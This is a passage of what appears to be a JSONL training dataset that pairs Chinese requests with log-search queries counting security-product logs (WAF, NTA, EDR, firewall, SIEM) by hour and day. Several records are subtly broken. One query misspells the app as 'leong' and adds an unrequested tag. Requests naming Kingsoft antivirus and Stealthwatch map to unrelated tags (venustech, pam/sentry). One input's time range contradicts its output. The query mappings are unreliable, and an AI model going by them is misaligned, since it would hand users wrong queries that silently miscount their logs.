line=\"今天\"]]|append[[ starttime=\"-7d/d\" endtime=\"-6d/d\" appname:fortress tag:sbr  (NOT fortress.log_type:AUDIT_LOG NOT fortress.log_type:SYS_STATE_ALARM) | rename fortress.* as * | bucket timestamp span=1h as ts  |eval time=formatdate(ts,\"HH:mm\")|stats count() as cnt by time |eval line=\"上周\"]]"}
{"input": "为三个查询分别设置时间范围为过去三天\n查询appname为nta,tag为chaitin的数据\n将时间戳按1小时间隔分桶\n格式化时间戳为HH:mm\n统计数量\n标记为\"今天\"、\"昨天\"、\"上周同期\"后追加合并", "instruction": "我想问的是，从上周到昨天到今天，每小时各有多少条包含 chaitin 和 nta 标签的日志？", "output": "starttime=\"now/d\" endtime=\"now\" appname:nta tag:chaitin|bucket timestamp span=1h as ts|eval ts=formatdate(ts,\"HH:mm\"),line=\"今天\"|stats count() as cnt  by ts,line|append [[ starttime=\"-1d/d\" endtime=\"now/d\" appname:nta tag:chaitin |bucket timestamp span=1h as ts |eval ts=formatdate(ts,\"HH:mm\"),line=\"昨天\" |stats count() as cnt  by ts,line]]|append [[ starttime=\"-7d/d\" endtime=\"-6d/d\" appname:nta tag:chaitin |bucket timestamp span=1h as ts |eval ts=formatdate(ts,\"HH:mm\"),line=\"上周同期\" |stats count() as cnt  by ts,line]]"}
{"input": "设置三个查询的时间范围为过去三天\n查询appname为leon的数据\n将时间戳按1小时间隔分桶\n格式化时间戳为HH:mm\n统计数量\n追加三个查询内容之前，分别标记为\"今天\"、\"昨天\"、\"前天\"\n", "instruction": "我想问的是，昨天、前天和今天分别有几条leon应用日志？请列出时间段和数量。", "output": "starttime=\"now/d\" endtime=\"now\" appname:leong|bucket timestamp span=1h as ts|eval ts=formatdate(ts,\"HH:mm\"),line=\"今天\"|stats count() as cnt  by ts,line|append [[ starttime=\"-1d/d\" endtime=\"now/d\" appname:leon tag:tjym |bucket timestamp span=1h as ts |eval ts=formatdate(ts,\"HH:mm\"),line=\"昨天\" |stats count() as cnt  by ts,line]]|append [[ starttime=\"-2d/d\" endtime=\"-1d/d\" appname:leon tag:tjym |bucket timestamp span=1h as ts |eval ts=formatdate(ts,\"HH:mm\"),line=\"前天\" |stats count() as cnt  by ts,line]]"}
{"input": "设置时间范围为今天和昨天\n两个查询除时间范围外，其余条件均为appname为waf,tag为imperva,级别为高的数据\n各自统计数量\n并标记为\"今天\"、\"昨天\"\n最后合并在一起", "instruction": "我想知道 Imperva WAF 产品的高危漏洞和安全问题在今天和昨天有何不同。", "output": "starttime=\"now/d\" endtime=\"now\" appname:waf AND tag:imperva AND (waf.level:High OR waf.level:\"高\")|stats count() |eval line=\"今天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\" appname:waf AND tag:imperva AND (waf.level:High OR waf.level:\"高\")|stats count() |eval line=\"昨天\"]]"}
{"input": "设置时间范围为今天和昨天\n两个查询除时间范围外,其余条件均为appname为pcap,tag为etp,包含malicious的数据\n各自统计数量\n并标记为\"今天\"、\"昨天\"\n最后合并在一起", "instruction": "请帮我查询一下pcap的etp标签中包含malicious的数据,分别统计出今天和昨天的数量。", "output": "starttime=\"now/d\" endtime=\"now\" appname:pcap AND tag:etp AND pcap:malicious|stats count() |eval line=\"今天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\" appname:pcap AND tag:etp AND pcap:malicious|stats count() |eval line=\"昨天\"]]"}
{"input": "设置时间范围为过去三天\n三个查询除时间范围外,其余条件均为appname为ngfw,tag为hillstone,事件类型为url过滤的数据\n各自统计数量\n并标记为\"今天\"、\"昨天\"、\"前天\"\n最后合并追加在一起", "instruction": "请帮我查询一下ngfw的hillstone标签中的url过滤事件,分别统计出过去三天的数量。", "output": "starttime=\"now/d\" endtime=\"now\" appname:ngfw AND tag:hillstone AND ngfw.event_type:url过滤|stats count() |eval line=\"今天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\" appname:ngfw AND tag:hillstone AND ngfw.event_type:url过滤|stats count() |eval line=\"昨天\"]]|append [[starttime=\"-2d/d\" endtime=\"-1d/d\" appname:ngfw AND tag:hillstone AND ngfw.event_type:url过滤|stats count() |eval line=\"前天\"]]"}
{"input": "设置时间范围为今天和昨天\n两个查询除时间范围外,其余条件均为appname为nta,tag为天眼查的数据\n各自统计数量\n并标记为\"今天\"、\"昨天\"\n最后合并在一起", "instruction": "请帮我查询天眼查的日志数量,分别统计出今天和昨天的情况。", "output": "starttime=\"now/d\" endtime=\"now\" appname:nta AND tag:天眼查|stats count() |eval line=\"今天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\" appname:nta AND tag:天眼查|stats count() |eval line=\"昨天\"]]"}
{"input": "设置时间范围为今天和昨天\n两个查询除时间范围外,其余条件均为appname为va,tag为nessus的数据\n各自统计数量\n并标记为\"今天\"、\"昨天\"\n最后合并在一起", "instruction": "请帮我查询nessus漏洞扫描的日志,分别统计出今天和昨天的数量。", "output": "starttime=\"now/d\" endtime=\"now\" appname:va AND tag:nessus|stats count() |eval line=\"今天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\" appname:va AND tag:nessus|stats count() |eval line=\"昨天\"]]"}
{"input": "设置时间范围为今天和昨天\n两个查询除时间范围外,其余条件均为appname为siem,tag为qradar的数据\n各自统计数量\n并标记为\"今天\"、\"昨天\"\n最后合并在一起", "instruction": "请帮我统计一下qradar的日志数量,分别计算出今天和昨天的结果。", "output": "starttime=\"now/d\" endtime=\"now\" appname:siem AND tag:qradar|stats count() |eval line=\"今天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\" appname:siem AND tag:qradar|stats count() |eval line=\"昨天\"]]"}
{"input": "设置时间范围为今天和昨天\n两个查询除时间范围外,其余条件均为appname为av,tag为venustech的数据\n各自统计数量\n并标记为\"今天\"、\"昨天\"\n最后合并在一起", "instruction": "请统计一下金山毒霸的日志,分别计算出今天和昨天的数量。", "output": "starttime=\"now/d\" endtime=\"now\" appname:av AND tag:venustech|stats count() |eval line=\"今天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\" appname:av AND tag:venustech|stats count() |eval line=\"昨天\"]]"}
{"input": "设置时间范围为过去三天\n三个查询除时间范围外,其余条件均为appname为edr,tag为xg-6的数据\n各自统计数量\n并标记为\"今天\"、\"昨天\"、\"前天\"\n最后合并追加在一起", "instruction": "请帮我统计xg-6edr的日志数量,计算出过去三天的结果。", "output": "starttime=\"now/d\" endtime=\"now\" appname:edr AND tag:xg-6|stats count() |eval line=\"今天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\" appname:edr AND tag:xg-6|stats count() |eval line=\"昨天\"]]|append [[starttime=\"-2d/d\" endtime=\"-1d/d\" appname:edr AND tag:xg-6|stats count() |eval line=\"前天\"]]"}
{"input": "设置时间范围为今天和昨天\n两个查询除时间范围外,其余条件均为appname为ngfw,tag为abb-g数据\n各自统计数量\n并标记为\"今天\"、\"昨天\"\n最后合并在一起", "instruction": "请统计abb-g防火墙的日志数,分别计算今天和昨天的结果。", "output": "starttime=\"now/d\" endtime=\"now\" appname:ngfw AND tag:abb-g|stats count() |eval line=\"今天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\" appname:ngfw AND tag:abb-g|stats count() |eval line=\"昨天\"]]"}
{"input": "设置时间范围为今天和昨天\n两个查询除时间范围外,其余条件均为appname为casb,tag为symantec数据\n各自统计数量\n并标记为\"今天\"、\"昨天\"\n最后合并在一起", "instruction": "请统计赛门铁克CASB的日志,分别计算今天和昨天的数量。", "output": "starttime=\"now/d\" endtime=\"now\" appname:casb AND tag:symantec|stats count() |eval line=\"今天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\" appname:casb AND tag:symantec|stats count() |eval line=\"昨天\"]]"}
{"input": "设置时间范围为今天和昨天\n两个查询除时间范围外,其余条件均为appname为pam,tag为sentry数据\n各自统计数量\n并标记为\"今天\"、\"昨天\"\n最后合并在一起", "instruction": "请统计stealthwatch的日志数量,分别计算今天和昨天的结果。", "output": "starttime=\"now/d\" endtime=\"now\" appname:pam AND tag:sentry|stats count() |eval line=\"今天\"|append [[starttime=\"-1d/d\" endtime=\"now/d\" appname:pam AND tag:sentry|stats count() |eval line=\"昨天\"]]"}
